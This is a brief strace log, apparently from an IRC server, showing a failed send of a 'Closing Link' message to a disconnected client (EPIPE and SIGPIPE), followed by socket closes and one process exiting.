4519  07:35:09.102017 send(6, "ERROR :Closing Link: [10.0.2.4] (Connection reset by peer)\r\n", 60, 0) = -1 EPIPE (Broken pipe)
4519  07:35:09.102033 --- SIGPIPE (Broken pipe) @ 0 (0) ---
4519  07:35:09.102067 close(6)          = 0
4519  07:35:09.102083 gettimeofday({1495625709, 102087}, NULL) = 0
4519  07:35:09.102095 select(1024, [2 3 4 7 9], [], NULL, {1, 0} <unfinished ...>
10891 07:35:09.617668 <... read resumed> "", 4096) = 0
10891 07:35:09.617829 close(8)          = 0
10891 07:35:09.617965 exit_group(0)     = ?
